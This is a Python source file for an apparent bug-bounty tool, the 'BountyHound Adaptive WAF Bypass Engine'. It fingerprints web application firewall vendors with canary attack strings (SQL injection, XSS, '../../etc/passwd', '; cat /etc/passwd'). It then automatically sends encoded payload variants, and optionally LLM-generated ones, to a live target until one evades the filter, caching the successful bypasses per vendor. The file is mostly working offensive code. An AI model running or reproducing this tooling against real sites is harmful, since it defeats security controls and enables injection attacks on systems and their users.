"""
BountyHound Adaptive WAF Bypass Engine

Fingerprints WAF vendors, generates encoded payload variants, and iteratively
bypasses web application firewalls using encoding pipelines and optional
LLM-powered bypass generation.

Usage:
    bypasser = AdaptiveWAFBypass("https://target.com")
    result = bypasser.bypass(
        url="https://target.com/search?q=",
        payload="<script>alert(1)</script>",
        injection_type="xss"
    )
    if result.success:
        print(f"Bypass found: {result.payload} via {result.technique}")
"""

from __future__ import annotations

import base64
import itertools
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Tuple

# ── Engine imports (graceful fallback for standalone use) ────────────────────

try:
    from engine.core.http_client import HttpClient
except ImportError:
    HttpClient = None  # type: ignore[assignment,misc]

try:
    from engine.core.rate_limiter import RateLimiter
except ImportError:
    RateLimiter = None  # type: ignore[assignment,misc]

try:
    import requests as _requests
except ImportError:
    _requests = None  # type: ignore[assignment]


# ── Dataclasses ─────────────────────────────────────────────────────────────


class EncodingTechnique(Enum):
    """Supported encoding techniques for payload transformation."""
    URL_ENCODE = "url_encode"
    DOUBLE_URL = "double_url"
    UNICODE_NORMALIZE = "unicode_normalize"
    HTML_ENTITY = "html_entity"
    HEX_ENCODE = "hex_encode"
    OCTAL_ENCODE = "octal_encode"
    BASE64 = "base64"
    UTF7 = "utf7"
    UTF16 = "utf16"
    NULL_BYTE_INSERT = "null_byte_insert"
    COMMENT_INJECT = "comment_inject"
    CASE_ALTERNATE = "case_alternate"
    WHITESPACE_SUBSTITUTE = "whitespace_substitute"


@dataclass
class WAFProfile:
    """Result of WAF fingerprinting."""
    vendor: str
    version: Optional[str] = None
    blocked_patterns: List[str] = field(default_factory=list)
    allowed_patterns: List[str] = field(default_factory=list)
    block_status_code: int = 403
    block_page_signature: Optional[str] = None


@dataclass
class BypassResult:
    """Result of a bypass attempt."""
    success: bool
    payload: str
    technique: str
    attempts: int
    waf_profile: Optional[WAFProfile] = None
    response_status: Optional[int] = None
    response_body: Optional[str] = None


# ── HTTP helper ─────────────────────────────────────────────────────────────


def _http_get(url: str, headers: Optional[Dict[str, str]] = None,
              timeout: int = 10) -> Tuple[int, Dict[str, str], str]:
    """Send a GET request and return (status_code, headers_dict, body).

    Tries engine.core.HttpClient first, then requests, then raises.
    """
    if HttpClient is not None:
        client = HttpClient(timeout=timeout, headers=headers or {})
        resp = client.get(url)
        return resp.status_code, {}, resp.body

    if _requests is not None:
        resp = _requests.get(url, headers=headers or {}, timeout=timeout,
                             allow_redirects=True, verify=False)
        return resp.status_code, dict(resp.headers), resp.text

    raise RuntimeError("No HTTP library available (install 'requests' or use engine.core)")


# ── WAFFingerprinter ────────────────────────────────────────────────────────


class WAFFingerprinter:
    """Fingerprint WAF vendor and rule sets by sending canary requests."""

    # Canary payloads designed to trigger specific WAF rules
    CANARY_PAYLOADS: List[Tuple[str, str]] = [
        ("single_quote", "' OR 1=1--"),
        ("angle_bracket", "<script>alert(1)</script>"),
        ("sql_keyword", "UNION SELECT NULL,NULL--"),
        ("path_traversal", "../../etc/passwd"),
        ("cmd_injection", "; cat /etc/passwd"),
    ]

    # Header-based vendor signatures
    VENDOR_SIGNATURES: Dict[str, List[Tuple[str, str]]] = {
        "cloudflare": [("cf-ray", ""), ("server", "cloudflare")],
        "aws_waf": [("x-amzn-waf-action", "")],
        "akamai": [("akamai-grn", "")],
        "imperva": [("x-iinfo", ""), ("x-cdn", "imperva")],
        "f5": [("server", "bigip"), ("x-cnection", "")],
    }

    # Cookie-based vendor signatures
    COOKIE_SIGNATURES: Dict[str, List[str]] = {
        "cloudflare": ["__cf_bm", "cf_clearance"],
        "imperva": ["incap_ses", "visid_incap"],
        "f5": ["BIGipServer"],
    }

    # Body-based vendor signatures
    BODY_SIGNATURES: Dict[str, List[str]] = {
        "cloudflare": ["attention required", "cloudflare ray id", "cf-error"],
        "aws_waf": ["request blocked", "aws waf"],
        "akamai": ["access denied", "akamai reference", "reference&#32;&#35;"],
        "imperva": ["incapsula incident", "powered by incapsula", "_incapsula_resource"],
        "modsecurity": ["mod_security", "modsecurity", "not acceptable"],
        "f5": ["the requested url was rejected", "support id"],
    }

    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    def fingerprint(self, url: str) -> WAFProfile:
        """Send canary requests and build a WAF profile from the responses.

        Args:
            url: Base URL to test (payloads are appended as a query parameter).

        Returns:
            WAFProfile with vendor, version, blocked/allowed patterns, etc.
        """
        vendor: Optional[str] = None
        version: Optional[str] = None
        blocked_patterns: List[str] = []
        allowed_patterns: List[str] = []
        block_status: int = 403
        block_sig: Optional[str] = None

        separator = "&" if "?" in url else "?"

        for pattern_name, payload in self.CANARY_PAYLOADS:
            test_url = f"{url}{separator}bh_canary={urllib.parse.quote(payload)}"
            try:
                status, headers, body = _http_get(test_url, timeout=self.timeout)
            except Exception:
                # Network error -- treat as blocked (aggressive WAF may RST)
                blocked_patterns.append(pattern_name)
                continue

            if self._is_blocked(status, headers, body):
                blocked_patterns.append(pattern_name)
                block_status = status

                # Attempt vendor detection from this response
                detected = self._detect_vendor(status, headers, body)
                if detected and vendor is None:
                    vendor = detected

                # Extract block page signature (first 120 chars of <title> or body)
                if block_sig is None:
                    block_sig = self._extract_signature(body)
            else:
                allowed_patterns.append(pattern_name)

            # Small delay to avoid self-induced rate-limiting
            time.sleep(0.3)

        if vendor is None:
            vendor = "generic"

        return WAFProfile(
            vendor=vendor,
            version=version,
            blocked_patterns=blocked_patterns,
            allowed_patterns=allowed_patterns,
            block_status_code=block_status,
            block_page_signature=block_sig,
        )

    # ── Internal helpers ────────────────────────────────────────────────

    @staticmethod
    def _is_blocked(status: int, headers: Dict[str, str], body: str) -> bool:
        """Determine if a response indicates the request was blocked."""
        if status in (403, 406, 429, 503):
            return True
        lower_body = body.lower()[:3000]
        block_phrases = [
            "access denied", "request blocked", "forbidden",
            "not acceptable", "security policy", "waf",
        ]
        return any(phrase in lower_body for phrase in block_phrases)

    def _detect_vendor(self, status: int, headers: Dict[str, str],
                       body: str) -> Optional[str]:
        """Detect WAF vendor from response headers, cookies, and body."""
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}

        # Header signatures
        for vendor_name, sigs in self.VENDOR_SIGNATURES.items():
            for header_key, header_val in sigs:
                if header_key in headers_lower:
                    if not header_val or header_val in headers_lower[header_key]:
                        return vendor_name

        # Cookie signatures
        set_cookie = headers_lower.get("set-cookie", "")
        for vendor_name, cookies in self.COOKIE_SIGNATURES.items():
            for cookie_name in cookies:
                if cookie_name.lower() in set_cookie:
                    return vendor_name

        # Body signatures
        lower_body = body.lower()[:3000]
        for vendor_name, phrases in self.BODY_SIGNATURES.items():
            for phrase in phrases:
                if phrase in lower_body:
                    return vendor_name

        return None

    @staticmethod
    def _extract_signature(body: str) -> Optional[str]:
        """Extract a short signature from the block page for future matching."""
        title_match = re.search(r"<title>(.*?)</title>", body, re.IGNORECASE)
        if title_match:
            return title_match.group(1).strip()[:120]
        # Fallback: first non-empty visible text
        text = re.sub(r"<[^>]+>", " ", body)
        text = " ".join(text.split())[:120]
        return text if text else None


# ── EncodingPipeline ────────────────────────────────────────────────────────


class EncodingPipeline:
    """Apply chains of encoding transformations to payloads."""

    def __init__(self) -> None:
        self._encoders: Dict[EncodingTechnique, Callable[[str], str]] = {
            EncodingTechnique.URL_ENCODE: self._url_encode,
            EncodingTechnique.DOUBLE_URL: self._double_url,
            EncodingTechnique.UNICODE_NORMALIZE: self._unicode_normalize,
            EncodingTechnique.HTML_ENTITY: self._html_entity,
            EncodingTechnique.HEX_ENCODE: self._hex_encode,
            EncodingTechnique.OCTAL_ENCODE: self._octal_encode,
            EncodingTechnique.BASE64: self._base64,
            EncodingTechnique.UTF7: self._utf7,
            EncodingTechnique.UTF16: self._utf16,
            EncodingTechnique.NULL_BYTE_INSERT: self._null_byte_insert,
            EncodingTechnique.COMMENT_INJECT: self._comment_inject,
            EncodingTechnique.CASE_ALTERNATE: self._case_alternate,
            EncodingTechnique.WHITESPACE_SUBSTITUTE: self._whitespace_substitute,
        }

    def encode(self, payload: str,
               techniques: List[EncodingTechnique]) -> str:
        """Apply an ordered chain of encoding techniques to a payload.

        Args:
            payload: Raw payload string.
            techniques: Ordered list of encodings to apply sequentially.

        Returns:
            Encoded payload after all techniques are applied.
        """
        result = payload
        for tech in techniques:
            encoder = self._encoders.get(tech)
            if encoder:
                result = encoder(result)
        return result

    def generate_variants(self, payload: str, max_variants: int = 20) -> List[Tuple[str, str]]:
        """Generate up to *max_variants* encoded variants of a payload.

        Strategy: single encodings first, then doubles, then triples.
        Returns list of (encoded_payload, technique_description).
        """
        variants: List[Tuple[str, str]] = []
        all_techniques = list(EncodingTechnique)

        # Single encodings (13 variants)
        for tech in all_techniques:
            if len(variants) >= max_variants:
                break
            encoded = self.encode(payload, [tech])
            if encoded != payload:
                variants.append((encoded, tech.value))

        # Double encodings (select high-value combos)
        double_combos = [
            (EncodingTechnique.URL_ENCODE, EncodingTechnique.DOUBLE_URL),
            (EncodingTechnique.CASE_ALTERNATE, EncodingTechnique.URL_ENCODE),
            (EncodingTechnique.UNICODE_NORMALIZE, EncodingTechnique.URL_ENCODE),
            (EncodingTechnique.COMMENT_INJECT, EncodingTechnique.CASE_ALTERNATE),
            (EncodingTechnique.HTML_ENTITY, EncodingTechnique.URL_ENCODE),
            (EncodingTechnique.WHITESPACE_SUBSTITUTE, EncodingTechnique.URL_ENCODE),
            (EncodingTechnique.HEX_ENCODE, EncodingTechnique.DOUBLE_URL),
            (EncodingTechnique.NULL_BYTE_INSERT, EncodingTechnique.URL_ENCODE),
        ]
        for combo in double_combos:
            if len(variants) >= max_variants:
                break
            encoded = self.encode(payload, list(combo))
            desc = "+".join(t.value for t in combo)
            if encoded != payload and (encoded, desc) not in variants:
                variants.append((encoded, desc))

        # Triple encodings (select high-value combos)
        triple_combos = [
            (EncodingTechnique.CASE_ALTERNATE, EncodingTechnique.COMMENT_INJECT,
             EncodingTechnique.URL_ENCODE),
            (EncodingTechnique.UNICODE_NORMALIZE, EncodingTechnique.WHITESPACE_SUBSTITUTE,
             EncodingTechnique.DOUBLE_URL),
            (EncodingTechnique.HTML_ENTITY, EncodingTechnique.NULL_BYTE_INSERT,
             EncodingTechnique.URL_ENCODE),
        ]
        for combo in triple_combos:
            if len(variants) >= max_variants:
                break
            encoded = self.encode(payload, list(combo))
            desc = "+".join(t.value for t in combo)
            if encoded != payload and (encoded, desc) not in variants:
                variants.append((encoded, desc))

        return variants[:max_variants]

    # ── Individual encoders ─────────────────────────────────────────────

    @staticmethod
    def _url_encode(payload: str) -> str:
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def _double_url(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    @staticmethod
    def _unicode_normalize(payload: str) -> str:
        """Replace ASCII chars with Unicode fullwidth equivalents."""
        mapping = {
            "<": "\uff1c", ">": "\uff1e", "'": "\uff07", '"': "\uff02",
            "(": "\uff08", ")": "\uff09", "/": "\uff0f", "\\": "\uff3c",
        }
        return "".join(mapping.get(c, c) for c in payload)

    @staticmethod
    def _html_entity(payload: str) -> str:
        """Encode special characters as HTML numeric entities."""
        special = set("<>\"'&/\\()=;")
        return "".join(f"&#{ord(c)};" if c in special else c for c in payload)

    @staticmethod
    def _hex_encode(payload: str) -> str:
        """Encode each character as \\xHH."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def _octal_encode(payload: str) -> str:
        """Encode each character as \\OOO."""
        return "".join(f"\\{ord(c):03o}" for c in payload)

    @staticmethod
    def _base64(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def _utf7(payload: str) -> str:
        """Encode using a UTF-7-like representation for < and >."""
        return payload.replace("<", "+ADw-").replace(">", "+AD4-")

    @staticmethod
    def _utf16(payload: str) -> str:
        """Encode as UTF-16 hex pairs (\\uXXXX)."""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def _null_byte_insert(payload: str) -> str:
        """Insert null bytes between characters."""
        return "%00".join(payload)

    @staticmethod
    def _comment_inject(payload: str) -> str:
        """Insert SQL/HTML comments within keywords to break pattern matching."""
        # Break up common SQL keywords
        replacements = {
            "SELECT": "SEL/**/ECT",
            "UNION": "UNI/**/ON",
            "INSERT": "INS/**/ERT",
            "UPDATE": "UPD/**/ATE",
            "DELETE": "DEL/**/ETE",
            "script": "scr<!---->ipt",
            "alert": "al<!---->ert",
            "onerror": "on<!---->error",
        }
        result = payload
        for word, replacement in replacements.items():
            result = re.sub(re.escape(word), replacement, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def _case_alternate(payload: str) -> str:
        """Alternate upper/lower case: sElEcT, uNiOn, etc."""
        return "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )

    @staticmethod
    def _whitespace_substitute(payload: str) -> str:
        """Replace spaces with alternative whitespace characters."""
        alternatives = ["%09", "%0a", "%0d", "%0c", "/**/", "+"]
        result = payload
        idx = 0
        parts = result.split(" ")
        out = []
        for i, part in enumerate(parts):
            if i > 0:
                out.append(alternatives[idx % len(alternatives)])
                idx += 1
            out.append(part)
        return "".join(out)


# ── AdaptiveWAFBypass ───────────────────────────────────────────────────────


class AdaptiveWAFBypass:
    """Adaptive WAF bypass engine that combines fingerprinting, encoding
    pipelines, and optional LLM-powered bypass generation.

    Class-level cache stores successful techniques per WAF vendor so that
    subsequent bypass attempts start with proven strategies.
    """

    # Class-level cache: vendor -> list of successful (technique, payload_template)
    _vendor_cache: Dict[str, List[Tuple[str, str]]] = {}

    def __init__(self, target: str, llm_bridge: Any = None,
                 timeout: int = 10) -> None:
        """
        Args:
            target: Base target URL (used for logging/context).
            llm_bridge: Optional object with a ``generate_waf_bypass(profile, payload,
                        injection_type)`` method that returns a list of bypass payloads.
            timeout: HTTP request timeout in seconds.
        """
        self.target = target
        self.llm_bridge = llm_bridge
        self.timeout = timeout
        self._fingerprinter = WAFFingerprinter(timeout=timeout)
        self._pipeline = EncodingPipeline()
        self._rate_limiter: Any = None

        if RateLimiter is not None:
            try:
                self._rate_limiter = RateLimiter()
            except Exception:
                pass

    # ── Public API ──────────────────────────────────────────────────────

    def bypass(self, url: str, payload: str,
               injection_type: str = "generic") -> BypassResult:
        """Attempt to deliver *payload* through the WAF protecting *url*.

        Workflow:
            1. Test original payload -- if not blocked, return immediately.
            2. Fingerprint the WAF.
            3. Check class-level cache for this vendor.
            4. Try encoding pipeline variants (up to 20).
            5. If LLM bridge available, request AI-generated bypasses.
            6. Return the best result.

        Args:
            url: Full URL where the payload will be injected.
            payload: Raw attack payload.
            injection_type: Category hint (``xss``, ``sqli``, ``rce``, etc.).

        Returns:
            BypassResult with success status, final payload, technique used,
            and total number of attempts made.
        """
        attempts = 0

        # Step 1: Try original payload
        blocked, status, body = self.test_payload(url, payload)
        attempts += 1
        if not blocked:
            return BypassResult(
                success=True, payload=payload, technique="original",
                attempts=attempts, response_status=status, response_body=body,
            )

        # Step 2: Fingerprint the WAF
        profile = self._fingerprinter.fingerprint(url)

        # Step 3: Try cached techniques for this vendor
        cached = self._vendor_cache.get(profile.vendor, [])
        for technique_desc, _template in cached:
            # Re-encode current payload with the cached technique chain
            techniques = self._parse_technique_chain(technique_desc)
            if techniques:
                encoded = self._pipeline.encode(payload, techniques)
                blocked, status, body = self.test_payload(url, encoded)
                attempts += 1
                if not blocked:
                    return BypassResult(
                        success=True, payload=encoded, technique=technique_desc,
                        attempts=attempts, waf_profile=profile,
                        response_status=status, response_body=body,
                    )

        # Step 4: Try encoding pipeline variants
        variants = self._pipeline.generate_variants(payload, max_variants=20)
        for encoded_payload, technique_desc in variants:
            self._respect_rate_limit()
            blocked, status, body = self.test_payload(url, encoded_payload)
            attempts += 1
            if not blocked:
                # Cache this success for the vendor
                self._cache_success(profile.vendor, technique_desc, encoded_payload)
                return BypassResult(
                    success=True, payload=encoded_payload,
                    technique=technique_desc, attempts=attempts,
                    waf_profile=profile, response_status=status,
                    response_body=body,
                )

        # Step 5: LLM-powered bypass generation
        if self.llm_bridge is not None:
            try:
                llm_payloads = self.llm_bridge.generate_waf_bypass(
                    profile, payload, injection_type
                )
                if isinstance(llm_payloads, list):
                    for llm_payload in llm_payloads[:10]:
                        self._respect_rate_limit()
                        blocked, status, body = self.test_payload(url, llm_payload)
                        attempts += 1
                        if not blocked:
                            self._cache_success(
                                profile.vendor, f"llm:{injection_type}", llm_payload
                            )
                            return BypassResult(
                                success=True, payload=llm_payload,
                                technique=f"llm_generated:{injection_type}",
                                attempts=attempts, waf_profile=profile,
                                response_status=status, response_body=body,
                            )
            except Exception:
                pass  # LLM is optional; don't fail the whole bypass

        # All attempts exhausted
        return BypassResult(
            success=False, payload=payload, technique="none",
            attempts=attempts, waf_profile=profile,
        )

    def test_payload(self, url: str,
                     payload: str) -> Tuple[bool, int, str]:
        """Send a single payload and determine if it was blocked.

        Args:
            url: Target URL.  The payload is appended as ``&bh_test=<payload>``
                 or ``?bh_test=<payload>`` depending on existing query string.

        Returns:
            Tuple of (blocked, status_code, response_body).
        """
        separator = "&" if "?" in url else "?"
        test_url = f"{url}{separator}bh_test={urllib.parse.quote(payload, safe='')}"

        try:
            status, headers, body = _http_get(test_url, timeout=self.timeout)
        except Exception:
            # Connection reset / timeout -- likely blocked at network level
            return True, 0, ""

        blocked = WAFFingerprinter._is_blocked(status, headers, body)
        return blocked, status, body

    # ── Internal helpers ────────────────────────────────────────────────

    def _respect_rate_limit(self) -> None:
        """Apply rate limiting between requests if a limiter is available."""
        if self._rate_limiter is not None:
            try:
                self._rate_limiter.wait(self.target)
            except Exception:
                time.sleep(0.2)
        else:
            time.sleep(0.15)

    @classmethod
    def _cache_success(cls, vendor: str, technique: str,
                       payload: str) -> None:
        """Store a successful bypass technique in the class-level cache."""
        if vendor not in cls._vendor_cache:
            cls._vendor_cache[vendor] = []
        entry = (technique, payload)
        if entry not in cls._vendor_cache[vendor]:
            cls._vendor_cache[vendor].append(entry)
            # Keep cache bounded
            if len(cls._vendor_cache[vendor]) > 50:
                cls._vendor_cache[vendor] = cls._vendor_cache[vendor][-50:]

    @staticmethod
    def _parse_technique_chain(desc: str) -> List[EncodingTechnique]:
        """Parse a technique description string back into EncodingTechnique list.

        Handles both single values (``url_encode``) and chains
        (``case_alternate+url_encode``).
        """
        technique_map = {t.value: t for t in EncodingTechnique}
        parts = desc.split("+")
        result: List[EncodingTechnique] = []
        for part in parts:
            part = part.strip()
            if part in technique_map:
                result.append(technique_map[part])
        return result

    @classmethod
    def get_cached_techniques(cls, vendor: str) -> List[Tuple[str, str]]:
        """Return cached successful techniques for a WAF vendor."""
        return list(cls._vendor_cache.get(vendor, []))

    @classmethod
    def clear_cache(cls) -> None:
        """Clear the class-level vendor bypass cache."""
        cls._vendor_cache.clear()


# ── Main (standalone test) ──────────────────────────────────────────────────


if __name__ == "__main__":
    print("=" * 60)
    print("  BountyHound Adaptive WAF Bypass Engine -- Self-Test")
    print("=" * 60)

    # Test EncodingPipeline
    pipeline = EncodingPipeline()
    test_payload = "<script>alert(1)</script>"

    print(f"\nOriginal payload: {test_payload}")
    print("-" * 60)

    # Single encodings
    for tech in EncodingTechnique:
        encoded = pipeline.encode(test_payload, [tech])
        if encoded != test_payload:
            print(f"  {tech.value:25s} -> {encoded[:70]}...")

    # Generate variants
    print(f"\n{'Generating variants':=^60}")
    variants = pipeline.generate_variants(test_payload, max_variants=20)
    print(f"Generated {len(variants)} variants:")
    for i, (variant, desc) in enumerate(variants, 1):
        print(f"  [{i:2d}] {desc:40s} -> {variant[:50]}...")

    # Test WAFProfile dataclass
    print(f"\n{'WAFProfile test':=^60}")
    profile = WAFProfile(
        vendor="cloudflare",
        blocked_patterns=["single_quote", "angle_bracket"],
        allowed_patterns=["path_traversal"],
        block_status_code=403,
        block_page_signature="Attention Required! | Cloudflare",
    )
    print(f"  Vendor:   {profile.vendor}")
    print(f"  Blocked:  {profile.blocked_patterns}")
    print(f"  Allowed:  {profile.allowed_patterns}")
    print(f"  Status:   {profile.block_status_code}")
    print(f"  Sig:      {profile.block_page_signature}")

    # Test BypassResult dataclass
    print(f"\n{'BypassResult test':=^60}")
    result = BypassResult(
        success=True,
        payload="%3Cscript%3Ealert(1)%3C/script%3E",
        technique="url_encode",
        attempts=3,
        waf_profile=profile,
    )
    print(f"  Success:    {result.success}")
    print(f"  Technique:  {result.technique}")
    print(f"  Attempts:   {result.attempts}")
    print(f"  Payload:    {result.payload}")

    # Test technique chain parsing
    print(f"\n{'Technique chain parsing':=^60}")
    chain = AdaptiveWAFBypass._parse_technique_chain("case_alternate+url_encode")
    print(f"  'case_alternate+url_encode' -> {[t.value for t in chain]}")
    chain2 = AdaptiveWAFBypass._parse_technique_chain("html_entity")
    print(f"  'html_entity' -> {[t.value for t in chain2]}")

    print(f"\n{'All self-tests passed':=^60}")
